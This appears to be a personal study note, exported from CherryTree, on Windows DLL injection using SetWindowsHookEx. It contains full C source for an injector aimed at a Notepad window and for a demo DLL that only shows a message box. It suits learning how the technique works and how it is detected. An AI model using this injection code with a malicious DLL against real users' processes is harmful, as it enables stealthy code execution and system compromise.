<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SetWindowsHookEx DLL Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># SetWindowsHookEx DLL Injection</h1></strong><br />• <a href="https://docs.microsoft.com/en-us/windows/win32/winmsg/using-hooks#installing-and-releasing-hook-procedures">https://docs.microsoft.com/en-us/windows/win32/winmsg/using-hooks#installing-and-releasing-hook-procedures</a> - READ THIS<br />• <a href="https://resources.infosecinstitute.com/topic/using-setwindowshookex-for-dll-injection-on-windows/">https://resources.infosecinstitute.com/topic/using-setwindowshookex-for-dll-injection-on-windows/</a> (sucks)<br />• <a href="http://www.rohitab.com/discuss/topic/43926-setwindowshookex-dll-injection-my-code-and-some-questions/">http://www.rohitab.com/discuss/topic/43926-setwindowshookex-dll-injection-my-code-and-some-questions/</a><br /><br />SetWindowsHookEx is how you set global and process-specific hooks using the Windows API.<br />Typically, you provide a hook procedure within a DLL and then call SetWindowsHookEx in a hook installer program to install the hook into the target process.<br /><br />When SetWindowsHookEx is called, it will load the specified DLL into the target process.<br />Internally, it calls <code>LoadLibrary</code>.<br />As a result, you can inject DLLs into target processes using SetWindowsHookEx.<br />To avoid hooking anything, you can just create an empty hook procedure in your DLL <br />e.g.<br /><div class="codebox"><div class="codebox">__declspec(dllexport)&nbsp;LRESULT&nbsp;CALLBACK&nbsp;HookMe(int&nbsp;nCode,&nbsp;WPARAM&nbsp;wParam,&nbsp;LPARAM&nbsp;lParam)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;do&nbsp;nothing<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;CallNextHookEx(NULL,&nbsp;nCode,&nbsp;wParam,&nbsp;lParam);<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h2>## Issues</h2></strong><br />• Because SetWindowsHookEx calls LoadLibrary internally, it&#39;s not stealthy. Detection will catch this<br /><br /><strong><h2>## Demo &amp; Code</h2></strong><br />This demo is running on Windows 10 x64 2004.<br />Both the DLL and injector code below is compiled as x64 release.<br />I&#39;m injecting into a 64bit <code>Notepad</code> process.<br /><br />I&#39;ve run my injector.<br />It has:<br />• found the target process<br />• loaded our DLL<br />• found its HookMe function<br />• set a hook on that function<br />• and triggered the hook by sending a NULL message to the target process <br />   ◇ this causes the DLL to attach to the target<br /><br /><a href=""><img src="images/1650-1.png" alt="images/1650-1.png" /></a><br /><br /><strong><h3>### injector.exe</h3></strong><br />This code injects the DLL into the target process.<br />The target process is specified by the <code>target_tid</code> in the <code>SetWindowsHookEx</code> call.<br /><div class="codebox"><div class="codebox">/*<br />Hook&nbsp;installer&nbsp;that&nbsp;targets&nbsp;a&nbsp;Notepad&nbsp;window.<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />BOOL&nbsp;InjectDLL(void)<br />{<br />	BOOL&nbsp;okay&nbsp;=&nbsp;TRUE;<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;FALSE;<br /><br />	HWND&nbsp;h_target_wnd&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;target_pid&nbsp;=&nbsp;0;<br />	DWORD&nbsp;target_tid&nbsp;=&nbsp;0;<br /><br />	HMODULE&nbsp;hmod_dll&nbsp;=&nbsp;NULL;<br />	HHOOK&nbsp;h_hook&nbsp;=&nbsp;NULL;<br /><br />	char&nbsp;target_window_name[]&nbsp;=&nbsp;&quot;Untitled&nbsp;-&nbsp;Notepad&quot;;<br />	char&nbsp;dll_path[]&nbsp;=&nbsp;&quot;C:\\Users\\bob\\source\\example_code\\injection\\dll_injection\\SetWindowsHookEx_injection\\dll_hook\\x64\\Release\\dll_hook.dll&quot;;<br />	char&nbsp;hook_function[]&nbsp;=&nbsp;&quot;HookMe&quot;;<br />	HOOKPROC&nbsp;hook_function_addr&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;get&nbsp;process&nbsp;ID&nbsp;and&nbsp;thread&nbsp;ID&nbsp;of&nbsp;target&nbsp;process<br />	h_target_wnd&nbsp;=&nbsp;FindWindowA(NULL,&nbsp;target_window_name);<br />	if&nbsp;(h_target_wnd&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;failed&nbsp;to&nbsp;find&nbsp;window&nbsp;\&quot;%s\&quot;:&nbsp;%d&nbsp;\n&quot;,&nbsp;target_window_name,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		return&nbsp;okay;<br />	}<br />	printf(&quot;[+]&nbsp;found&nbsp;target&nbsp;process:&nbsp;%s&nbsp;\n&quot;,&nbsp;target_window_name);<br /><br />	target_tid&nbsp;=&nbsp;GetWindowThreadProcessId(h_target_wnd,&nbsp;&amp;target_pid);<br /><br />	//&nbsp;load&nbsp;DLL&nbsp;to&nbsp;inject<br />	hmod_dll&nbsp;=&nbsp;LoadLibraryA(dll_path);<br />	if&nbsp;(hmod_dll&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;failed&nbsp;to&nbsp;load&nbsp;DLL:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		return&nbsp;okay;<br />	}<br />	printf(&quot;[+]&nbsp;loaded&nbsp;DLL&nbsp;\n&quot;);<br /><br />	//&nbsp;retrieve&nbsp;address&nbsp;of&nbsp;exported&nbsp;hook&nbsp;function&nbsp;in&nbsp;DLL<br />	hook_function_addr&nbsp;=&nbsp;(HOOKPROC)GetProcAddress(hmod_dll,&nbsp;hook_function);<br />	if&nbsp;(hook_function_addr&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;failed&nbsp;to&nbsp;find&nbsp;addr&nbsp;of&nbsp;exported&nbsp;HookMe&nbsp;function:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		return&nbsp;okay;<br />	}<br />	printf(&quot;[+]&nbsp;found&nbsp;%s&nbsp;function&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;hook_function,&nbsp;hook_function_addr);<br /><br />	/*<br />	Install&nbsp;the&nbsp;hook&nbsp;in&nbsp;the&nbsp;target&nbsp;process&nbsp;-&nbsp;this&nbsp;will&nbsp;cause&nbsp;our&nbsp;DLL&nbsp;to&nbsp;be&nbsp;loaded&nbsp;into&nbsp;the&nbsp;target&nbsp;process.<br />	If&nbsp;SetWindowHookEx&#39;s&nbsp;dwThreadId&nbsp;is&nbsp;set&nbsp;to&nbsp;0,&nbsp;this&nbsp;hook&nbsp;will&nbsp;be&nbsp;global&nbsp;and&nbsp;SetWindowsHookEx&nbsp;will&nbsp;inject&nbsp;your&nbsp;DLL&nbsp;into&nbsp;all&nbsp;processes.<br />	*/<br />	h_hook&nbsp;=&nbsp;SetWindowsHookExA(WH_GETMESSAGE,&nbsp;hook_function_addr,&nbsp;hmod_dll,&nbsp;target_tid);<br />	if&nbsp;(h_hook&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;failed&nbsp;to&nbsp;set&nbsp;hook:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		return&nbsp;okay;<br />	}<br />	printf(&quot;[+]&nbsp;set&nbsp;hook&nbsp;\n&quot;);<br /><br />	//&nbsp;trigger&nbsp;the&nbsp;hook&nbsp;by&nbsp;sending&nbsp;an&nbsp;empty&nbsp;message&nbsp;(not&nbsp;always&nbsp;necessary)<br />	//PostThreadMessage(target_tid,&nbsp;WM_NULL,&nbsp;0,&nbsp;0);<br />	//printf(&quot;[i]&nbsp;triggering&nbsp;hook...&nbsp;\n&quot;);<br /><br />	//&nbsp;pause&nbsp;execution&nbsp;of&nbsp;this&nbsp;hook&nbsp;installer&nbsp;program.&nbsp;upon&nbsp;key&nbsp;press,&nbsp;remove&nbsp;hook<br />	printf(&quot;\npress&nbsp;any&nbsp;key&nbsp;to&nbsp;unhook&nbsp;\n&quot;);<br />	system(&quot;pause&nbsp;&gt;&nbsp;nul&quot;);<br /><br />	b_ret&nbsp;=&nbsp;UnhookWindowsHookEx(h_hook);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;failed&nbsp;to&nbsp;remove&nbsp;hook:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		okay&nbsp;=&nbsp;FALSE;<br />		return&nbsp;okay;<br />	}<br />	printf(&quot;[+]&nbsp;hook&nbsp;removed!&nbsp;\n&quot;);<br /><br />	return&nbsp;okay;<br />}<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	InjectDLL();<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### injectme_dll.dll</h3></strong><br />This is the DLL to inject.<br />It has an exported function called <code>HookMe</code> which is used to set the hook / inject.<br />It spawns a MessageBox when the DLL is attached.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br /><br />__declspec(dllexport)&nbsp;LRESULT&nbsp;CALLBACK&nbsp;HookMe(int&nbsp;nCode,&nbsp;WPARAM&nbsp;wParam,&nbsp;LPARAM&nbsp;lParam)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;CallNextHookEx(NULL,&nbsp;nCode,&nbsp;wParam,&nbsp;lParam);<br />}<br /><br />BOOL&nbsp;WINAPI&nbsp;DllMain(HINSTANCE&nbsp;hinstDLL,&nbsp;DWORD&nbsp;fdwReason,&nbsp;LPVOID&nbsp;lpReserved)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(fdwReason)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_PROCESS_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MessageBoxA(NULL,&nbsp;&quot;hey!&nbsp;i&#39;ve&nbsp;been&nbsp;attached&nbsp;:)&quot;,&nbsp;&quot;smile&quot;,&nbsp;MB_OK);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_THREAD_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_THREAD_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_PROCESS_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;TRUE;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /></div>
</body>
</html>
